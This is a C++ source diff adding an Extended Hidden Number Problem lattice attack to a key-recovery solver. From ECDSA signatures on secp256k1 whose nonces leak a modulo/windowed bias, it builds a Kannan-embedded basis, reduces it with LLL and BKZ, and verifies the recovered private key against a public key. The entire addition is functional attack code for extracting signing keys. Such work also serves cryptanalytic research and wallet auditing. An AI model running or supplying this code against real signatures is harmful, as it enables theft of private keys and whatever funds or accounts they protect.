@@ -351,6 +351,232 @@ std::optional<mpz> LatticeSolver::reduce_and_extract(
     return best_d;
 }
 
+// ---- Phase 6c: Extended-HNP (two-block) lattice for modulo / windowed bias ----
+//
+// Model: nonce k = lambda + omega * mu, with 0 <= lambda < bound (the small,
+// known-range low window) and 0 <= mu < ~N/omega (the free high part). The HNP
+// relation is k ≡ w + x*d (mod N), i.e. per signature i:
+//     x_i*d - lambda_i - omega*mu_i + w_i ≡ 0  (mod N).
+// Unknowns: d, and per signature lambda_i (small) and mu_i (large). We build the
+// primal lattice of these unknowns with each coordinate normalized to ~2^256 by
+// a diagonal weight, force the mod-N congruences to zero with a big multiplier K
+// (Kannan CVP->SVP embedding), and read d out of its dedicated coordinate column
+// of the short vector. Centering each unknown around its interval midpoint (the
+// off_* terms) halves the target norm, exactly as build_boneh_venkatesan_basis
+// does for the single-block case. Every candidate is checked against pubkey_hint,
+// so a wrong (omega,bound) guess or an under-reduced basis simply fails to verify
+// -- it can never emit a wrong key. Derived and numerically validated in isolation
+// before landing (synthetic HNP instances; wide windows recover under LLL, narrow
+// under BKZ), see the project's design notes.
+//
+// Dimension is 3u+2 for u signatures (vs u+1 for the single-block basis): d, u
+// lambda coords, u mu coords, u mod-N rows, plus one embedding row/col.
+namespace {
+
+struct EhnpWeights {
+    mpz g_d, g_lam, g_mu, g_1;    // per-coordinate normalizers (~2^256 each)
+    mpz off_lam, off_mu, off_d;   // centering offsets (interval midpoints)
+    mpz Bmu;                      // mu bound ~ N/omega
+    size_t u, D;                  // signatures used, lattice dimension
+    size_t cd, clam, cmu, cemb;   // column offsets
+};
+
+bool build_ehnp_basis(const std::vector<Pair>& pairs, size_t u,
+                      const mpz& omega, const mpz& bound,
+                      ZZ_mat<mpz_t>& B, EhnpWeights& W) {
+    const mpz N = SECP256K1_N;
+    if (u < 8 || pairs.size() < u) return false;
+
+    W.u = u;
+    W.D = 3 * u + 2;
+    W.cd = u;
+    W.clam = u + 1;
+    W.cmu = 2 * u + 1;
+    W.cemb = 3 * u + 1;
+
+    const mpz TWO256 = mpz(1) << 256;
+    W.Bmu = (N / omega) + 1;
+    W.g_d = 1;
+    W.g_lam = TWO256 / bound;          // lambda*g_lam ~ 2^256
+    W.g_mu = TWO256 / W.Bmu;           // mu*g_mu ~ 2^256
+    W.g_1 = TWO256;
+    W.off_lam = bound >> 1;
+    W.off_mu = W.Bmu >> 1;
+    W.off_d = N >> 1;
+
+    const mpz K = mpz(1) << 520;       // >> N: forces the eq columns to zero
+    const mpz KN = K * N;
+
+    int dim = static_cast<int>(W.D);
+    B.resize(dim, dim);
+    for (int r = 0; r < dim; ++r)
+        for (int c = 0; c < dim; ++c)
+            mpz_set_ui(B[r][c].get_data(), 0);
+
+    auto keq = [&](const mpz& coeff_mod_n) {  // K*(coeff mod N), reduced mod K*N
+        mpz v = coeff_mod_n % N; if (v < 0) v += N;
+        v *= K; v %= KN; if (v < 0) v += KN;
+        return v;
+    };
+
+    size_t row = 0;
+    // d-row: eq_i = K*x_i ; coord col d = g_d
+    for (size_t i = 0; i < u; ++i) mpz_set(B[row][i].get_data(), keq(pairs[i].x).get_mpz_t());
+    mpz_set(B[row][W.cd].get_data(), W.g_d.get_mpz_t());
+    row++;
+    // lambda rows: eq_i = -K ; coord col lam_i = g_lam
+    mpz neg1 = N - 1;
+    for (size_t i = 0; i < u; ++i) {
+        mpz_set(B[row][i].get_data(), keq(neg1).get_mpz_t());
+        mpz_set(B[row][W.clam + i].get_data(), W.g_lam.get_mpz_t());
+        row++;
+    }
+    // mu rows: eq_i = -K*omega ; coord col mu_i = g_mu
+    mpz neg_omega = (N - (omega % N)) % N;
+    for (size_t i = 0; i < u; ++i) {
+        mpz_set(B[row][i].get_data(), keq(neg_omega).get_mpz_t());
+        mpz_set(B[row][W.cmu + i].get_data(), W.g_mu.get_mpz_t());
+        row++;
+    }
+    // mod-N rows: eq_i = K*N (lets LLL subtract the modulus)
+    for (size_t i = 0; i < u; ++i) { mpz_set(B[row][i].get_data(), KN.get_mpz_t()); row++; }
+    // target row: eq_i = K*cst_i, cst_i = w_i + x_i*off_d - off_lam - omega*off_mu
+    for (size_t i = 0; i < u; ++i) {
+        mpz cst = pairs[i].w + utils::mod_mul(pairs[i].x, W.off_d, N)
+                  - W.off_lam - utils::mod_mul(omega, W.off_mu, N);
+        mpz_set(B[row][i].get_data(), keq(cst).get_mpz_t());
+    }
+    mpz_set(B[row][W.cemb].get_data(), W.g_1.get_mpz_t());
+    return true;
+}
+
+// Extract d candidates from a reduced EHNP basis: the row bearing the centered
+// target has embed col == +/- g_1 (target-row coefficient +/-1); its d column,
+// undivided by g_d(==1) and un-centered by off_d, is d.
+std::vector<mpz> extract_ehnp_candidates(const ZZ_mat<mpz_t>& B, const EhnpWeights& W) {
+    const mpz N = SECP256K1_N;
+    std::vector<mpz> out;
+    for (size_t r = 0; r < W.D; ++r) {
+        mpz emb; mpz_set(emb.get_mpz_t(), B[r][W.cemb].get_data());
+        if (emb == 0) continue;
+        mpz scoeff = emb / W.g_1;
+        if (emb % W.g_1 != 0) continue;
+        if (scoeff != 1 && scoeff != -1) continue;
+        mpz dcoord; mpz_set(dcoord.get_mpz_t(), B[r][W.cd].get_data());
+        mpz dprime = (dcoord / W.g_d) * scoeff;   // scoeff in {+1,-1}
+        mpz dcand = (dprime + W.off_d) % N; if (dcand < 0) dcand += N;
+        if (dcand > 1 && dcand < N - 1) out.push_back(dcand);
+    }
+    return out;
+}
+
+} // namespace
+
+std::optional<mpz> LatticeSolver::recover_modulo(
+    const std::vector<Pair>& pairs,
+    const mpz& omega,
+    const mpz& bound,
+    size_t max_signatures,
+    Telemetry* telemetry,
+    const mpz& pubkey_hint
+) {
+    const mpz N = SECP256K1_N;
+    if (omega <= bound || bound < 1 || omega >= N) return std::nullopt;
+
+    // Leaked window width in bits ~ log2(omega/bound). Below ~5 bits the lattice
+    // gap is too small to resolve in any practical budget (mirrors MSB L<=3).
+    double window = std::log2(mpz_get_d(omega.get_mpz_t()) /
+                              std::max(1.0, mpz_get_d(bound.get_mpz_t())));
+    if (window < 5.0) return std::nullopt;
+
+    size_t avail = pairs.size();
+    if (max_signatures) avail = std::min(avail, max_signatures);
+
+    // Signatures needed: total leaked bits u*window must clear the 256-bit key
+    // with margin. ~2.2x the bare information bound (256/window) resolves
+    // reliably (validated on synthetic instances). Use exactly that many when
+    // available -- a wide window needs only a handful, so DON'T impose a flat
+    // floor (that was the bug: it demanded 40 sigs even for a 40-bit window that
+    // needs ~16). Cap u so the 3u+2 dimension stays tractable for LLL/BKZ.
+    size_t needed = static_cast<size_t>(std::ceil(2.2 * 256.0 / window));
+    size_t u = std::min<size_t>({avail, needed, static_cast<size_t>(90)});
+    // Reject instances with too little total leakage to have a real chance
+    // (below ~1.3x the information bound the target isn't the short vector).
+    if (u < 8 || static_cast<double>(u) * window < 256.0 * 1.3) return std::nullopt;
+
+    auto try_candidates = [&](const std::vector<mpz>& cands) -> std::optional<mpz> {
+        for (const auto& d : cands) {
+            if (pubkey_hint > 1) {
+                if (utils::verify_pubkey(d, pubkey_hint)) return d;
+            }
+        }
+        // No pubkey: score by how many nonces land in the window [0,bound) mod
+        // omega, accept only a near-perfect fit (best-effort, still gated by the
+        // engine's own Verifier downstream).
+        if (pubkey_hint <= 1) {
+            for (const auto& d : cands) {
+                size_t hit = 0, tested = std::min<size_t>(u, 30);
+                for (size_t i = 0; i < tested; ++i) {
+                    mpz k = utils::mod_add(pairs[i].w, utils::mod_mul(pairs[i].x, d, N), N);
+                    mpz res = k % omega; if (res < 0) res += omega;
+                    if (res < bound) hit++;
+                }
+                if (hit == tested) return d;
+            }
+        }
+        return std::nullopt;
+    };
+
+    // Reduction ladder: LLL first (resolves wide windows fast), then a bounded
+    // BKZ escalation for narrower windows. Every rung is pubkey-gated, so a rung
+    // that under-reduces just falls through to the next. Kept short: EHNP BKZ at
+    // this dimension is expensive, so we only start a rung that fits the budget.
+    struct Rung { int block; };
+    std::vector<Rung> ladder = {{0}, {20}, {30}};
+    for (const auto& rung : ladder) {
+        if (telemetry && telemetry->deadline_exceeded()) break;
+        // BKZ rungs are minute-scale at this dimension; skip if clearly no budget.
+        if (rung.block > 0 && telemetry && telemetry->remaining_budget_seconds() < 90.0) continue;
+
+        ZZ_mat<mpz_t> B;
+        EhnpWeights W;
+        if (!build_ehnp_basis(pairs, u, omega, bound, B, W)) return std::nullopt;
+
+        if (telemetry) {
+            telemetry->lattice_dim = static_cast<size_t>(W.D);
+            telemetry->signatures_used = u;
+            telemetry->current_block_size = rung.block;
+            telemetry->lattice_in_progress = true;
+            telemetry->set_phase(std::string("EHNP (modulo) reduction ") +
+                                 (rung.block > 0 ? "BKZ b=" + std::to_string(rung.block) : "LLL"));
+        }
+
+        bool ok;
+        if (rung.block > 0) {
+            std::vector<fplll::Strategy> strategies = load_bkz_pruning_strategies();
+            int status;
+            if (!strategies.empty()) {
+                BKZParam param(rung.block, strategies);
+                status = bkz_reduction(&B, nullptr, param);
+            } else {
+                status = bkz_reduction(B, rung.block, BKZ_DEFAULT);
+            }
+            ok = (status == RED_SUCCESS);
+        } else {
+            ZZ_mat<mpz_t> uu, uinv; uu.resize(0, 0); uinv.resize(0, 0);
+            Wrapper wrapper(B, uu, uinv, 0.99, 0.51, LLL_DEFAULT);
+            ok = wrapper.lll();
+        }
+
+        if (telemetry) telemetry->lattice_in_progress = false;
+        if (!ok) continue;
+
+        if (auto found = try_candidates(extract_ehnp_candidates(B, W))) return found;
+    }
+
+    return std::nullopt;
+}
+
 std::optional<mpz> LatticeSolver::recover_private_key(
     const std::vector<Pair>& pairs,
     const BiasProfile& bias,
